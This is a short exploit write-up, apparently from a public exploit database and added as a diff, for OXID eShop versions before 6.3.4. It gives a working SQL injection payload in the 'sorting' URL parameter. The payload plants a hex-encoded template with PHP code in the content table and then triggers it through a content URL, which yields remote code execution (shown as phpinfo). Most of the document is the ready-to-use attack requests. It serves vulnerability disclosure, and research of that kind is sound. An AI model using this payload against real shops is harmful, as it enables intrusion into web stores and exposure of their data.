@@ -1,0 +1,41 @@
+# Exploit Title: OXID eShop 6.3.4 - 'sorting' SQL Injection
+# Date: 2019-07-29
+# Exploit Author: VulnSpy
+# Vendor Homepage: https://www.oxid-esales.com/
+# Software Link: https://github.com/OXID-eSales/oxideshop_ce
+# Version: Versions 6.x (prior to 6.3.4)
+# Tested on: https://github.com/vsplate/dcenvs/tree/master/oxideshop_ce/6.3.3/dc
+# CVE:
+
+1. Click on any product item in the web page
+
+```bash
+e.g. http://***.vsgo.cloud/source/en/Kiteboarding/Kites/Kite-CORE-GT.html
+```
+
+2..Add `sorting` parameter after the URL of item detail ( Insert PHP code
+to database via SQL injection )
+
+```bash
+e.g. http://***.vsgo.cloud/source/en/Kiteboarding/Kites/Kite-CORE-GT.html?sorting=oxtitle|;insert
+into
+oxcontents(OXID,OXLOADID,OXPOSITION,OXACTIVE,OXTITLE,OXCONTENT,OXACTIVE_1,OXTITLE_1,OXCONTENT_1,OXFOLDER,OXTERMVERSION)
+
+VALUES(0x313233343536,0x76756c6e73707964656d6f, 0x00, 1,
+0x76756c6e73707964656d6f, 0x5b7b696620706870696e666f28297d5d5b7b2f69667d5d,
+1, 0x76756c6e73707964656d6f,
+0x5b7b696620706870696e666f28297d5d5b7b2f69667d5d,
+0x434d53464f4c4445525f55534552494e464f, 0x00);%23
+```
+
+3.Accessing the following links triggers PHP code execution and will
+display the PHPINFO page if exploited successfully.
+
+```bash
+http://***.vsgo.cloud/source/index.php?cl=content&oxloadid=vulnspydemo
+```
+
+Ref:
+* https://www.vulnspy.com/en-oxid-eshop-6.x-sqli-to-rce/
+* https://blog.ripstech.com/2019/oxid-esales-shop-software/
+* https://bugs.oxid-esales.com/view.php?id=7002
